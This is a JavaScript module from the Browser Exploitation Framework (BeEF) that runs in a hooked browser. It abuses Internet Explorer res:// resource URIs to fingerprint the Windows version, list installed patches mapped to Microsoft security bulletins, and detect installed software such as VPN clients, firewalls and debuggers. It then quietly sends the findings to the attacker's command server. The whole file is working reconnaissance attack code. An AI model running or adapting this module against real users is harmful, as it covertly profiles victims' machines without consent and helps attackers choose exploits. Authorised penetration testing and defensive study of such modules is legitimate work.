//
// Copyright (c) 2006-2017 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

	var os_version = new Array;
        var installed_patches = new Array;
	var installed_software = new Array;
	var dom = document.createElement('b');

	Array.prototype.unique = function() {
		var o = {}, i, l = this.length, r = [];
		for(i=0; i<l;i+=1) o[this[i]] = this[i];
		for(i in o) r.push(o[i]);
		return r;
	};

	parse_os_details = function() {
		if (!os_version.length) os_version[0] = "unknown"
                if (!installed_patches.length) installed_patches[0] = "unknown"
		if (!installed_software.length) installed_software[0] = "unknown"
                beef.net.send("<%= @command_url %>", <%= @command_id %>, "windows_nt_version="+os_version.unique());
		beef.net.send("<%= @command_url %>", <%= @command_id %>, "installed_patches=" +installed_patches.unique());
		beef.net.send("<%= @command_url %>", <%= @command_id %>, "installed_software="+installed_software.unique());
		document.body.removeChild(dom);
	};

	// OS fingerprints // in the form of: "URI","NT version(s)"
	var fingerprints = new Array(
		new Array("5.1+","res://IpsmSnap.dll/wlcm.bmp"),
		new Array("5.1+","res://wmploc.dll/257/album_0.png"),
		new Array("5.1-6.0","res://wmploc.dll/23/images\\amg-logo.gif"),
		new Array("5.1-6.1","res://wmploc.dll/wmcomlogo.jpg"),
		new Array("6.0+","res://wdc.dll/error.gif")
	);

	for (var i=0; i<fingerprints.length; i++) {
		var img    = new Image;
		img.name   = fingerprints[i][0];
		img.src    = fingerprints[i][1];
		img.onload = function() { os_version.push(this.name); dom.removeChild(this); }
                img.onerror= function() { dom.removeChild(this); }
		dom.appendChild(img);
	}

	// Enumerate patches (Win XP)
	var path = "res://C:\\WINDOWS\\$NtUninstall";
	var patches = new Array(
		new Array("KB2964358", "mshtml.dll/2/2030"), //MS14-021
		new Array("KB2936068", "mshtmled.dll/2/2503"), //MS14-018
		new Array("KB2864063", "themeui.dll/2/120"), //MS13-071
		new Array("KB2859537", "ntkrpamp.exe/2/1"), //MS13-063
		new Array("KB2813345", "mstscax.dll/2/101"), //MS13-029
		new Array("KB2820917", "winsrv.dll/#2/#512"), //MS13-033
		new Array("KB2691442", "shell32.dll/2/130"), //MS12-048
		new Array("KB2676562", "ntkrpamp.exe/2/1"), //MS12-034
		new Array("KB2506212", "mfc42.dll/#2/#26567"), //MS11-024
		new Array("KB2483185", "shell32.dll/2/130"), //MS11-006
		new Array("KB2481109", "mstsc.exe/#2/#620"), //MS11-017
		new Array("KB2443105", "isign32.dll/2/#101"), //MS10-097
		new Array("KB2393802", "ntkrnlpa.exe/2/#1"), //MS11-011
		new Array("KB2387149", "mfc40.dll/#2/#26567"), //MS10-074
		new Array("KB2296011", "comctl32.dll/#2/#120"), //MS10-081
		new Array("KB979687", "wordpad.exe/#2/#131"), //MS10-083
		new Array("KB978706", "mspaint.exe/#2/#102"), //MS10-005
		new Array("KB977914", "iyuv_32.dll/2/INDEOLOGO"), //MS10-013
		new Array("KB973869", "dhtmled.ocx/#2/#1") //MS09-037
	);
        for (var i=0; i<patches.length; i++) {
                var img    = new Image;
                img.name   = patches[i][0];
                img.src    = path+patches[i][0]+"$\\"+patches[i][1];
		img.onload = function() { installed_patches.push(this.name); dom.removeChild(this); }
		img.onerror= function() { dom.removeChild(this); }
                dom.appendChild(img);
        }

	// Enumerate software
	var software = new Array(
		new Array("Foxit Reader", "Foxit Software\\Foxit Reader\\Foxit Reader.exe/2/257"),
		new Array("Internet Explorer", "Internet Explorer\\iedvtool.dll/2/4000"),
		new Array("Outlook Express", "Outlook Express\\msoeres.dll/2/1"),
		new Array("Immunity Debugger", "Immunity Inc\\Immunity Debugger\\ImmunityDebugger.exe/2/GOTO"),
		new Array("Java JRE 1.7", "Java\\jre7\\bin\\awt.dll/2/CHECK_BITMAP"),
		//new Array("Microsoft Silverlight v5.1.30514.0", "Microsoft Silverlight\\5.1.30514.0\\npctrl.dll/2/102"),
		new Array("SQL Server Management Studio", "Microsoft SQL Server\\100\\Tools\\Binn\\VSShell\\Common7\\IDE\\Ssms.exe/2/124"),
		new Array("VMware Tools", "VMware\\VMware Tools\\TPVCGatewaydeu.dll/2/30994"),
		new Array("Notepad++", "Notepad++\\uninstall.exe/2/110"),
		new Array("FortiClient", "Fortinet\\FortiClient\\FortiClient.exe/2/186"),
		new Array("Cisco AnyConnect Secure Mobility Client", "Cisco\\Cisco AnyConnect Secure Mobility Client\\vpncommon.dll/2/30996"),
		new Array("OpenVPN", "OpenVPN\\Uninstall.exe/2/110"),
		new Array("Sophos Client Firewall", "Sophos\\Sophos Client Firewall\\logo_rc.dll/2/114"),
		new Array("VLC", "VideoLAN\\VLC\\npvlc.dll/2/3"),
		new Array("Windows DVD Maker", "DVD Maker\\DVDMaker.exe/2/438"),
		new Array("Windows Journal", "Windows Journal\\Journal.exe/2/112"),
		new Array("Windows Mail", "Windows Mail\\msoeres.dll/2/1"),
		new Array("Windows Movie Maker", "Movie Maker\\wmm2res.dll/2/201"),
		new Array("Windows NetMeeting", "NetMeeting\\nmchat.dll/2/207"),
		new Array("Windows Photo Viewer", "Windows Photo Viewer\\PhotoViewer.dll/2/#51209"),
		new Array("Wireshark", "Wireshark\\uninstall.exe/2/110")
		//new Array("ZeroMQ v4.0.4", "ZeroMQ 4.0.4\\Uninstall.exe/2/110")
	);

	var program_dirs = new Array("C:\\Program Files\\", "C:\\Program Files (x86)\\")
	for (dir=0;dir<program_dirs.length; dir++) {
          for (var i=0; i<software.length; i++) {
                var img    = new Image;
                img.name   = software[i][0];
                img.src    = "res://"+program_dirs[dir]+software[i][1];
                img.onload = function() { installed_software.push(this.name); dom.removeChild(this); }
                img.onerror= function() { dom.removeChild(this); }
                dom.appendChild(img);
          }
	}

	setTimeout('parse_os_details();', 5000);

});

